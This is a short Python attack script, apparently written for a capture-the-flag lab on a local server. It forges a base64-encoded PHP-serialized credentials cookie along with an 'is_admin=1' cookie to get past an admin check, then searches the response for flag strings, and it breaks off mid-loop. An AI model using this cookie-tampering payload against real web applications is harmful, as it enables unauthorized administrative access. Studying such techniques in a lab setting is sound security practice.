import requests
import base64
import re

base_url = "http://127.0.0.1:32921/"

print("[*] Testing baseline with normal array and is_admin=1...\n")

# Normal array with admin credentials
payload = 'a:2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}'
payload_b64 = base64.b64encode(payload.encode()).decode()

headers = {'Cookie': f'creds={payload_b64}; is_admin=1'}
resp = requests.get(base_url, headers=headers)

print(f"Payload: {payload}")
print(f"Status: {resp.status_code}")
print(f"Length: {len(resp.content)}B")

# Extract the main content (after the form)
content_match = re.search(r'</form>(.*?)</body>', resp.text, re.DOTALL)
if content_match:
    main_content = content_match.group(1).strip()
    print(f"\n[+] Main content after form:\n{main_content}")

# Check for rejection message
if "you are not the admin" in resp.text:
    print("\n[!] Still shows rejection message")
else:
    print("\n[+] NO rejection message - admin check passed!")

# Search for flag patterns
print("\n[*] Searching for flag patterns in full response...")
flag_patterns = [
    r'FLAG\{[^}]+\}',
    r'flag\{[^}]+\}',
    r'AUTH\{[^}]+\}',
    r'CTF\{[^}]+\}'
]

for pattern in flag_patterns:
    matches = re.findall(pattern, resp.text, re.IGNORECASE)
    if matches:
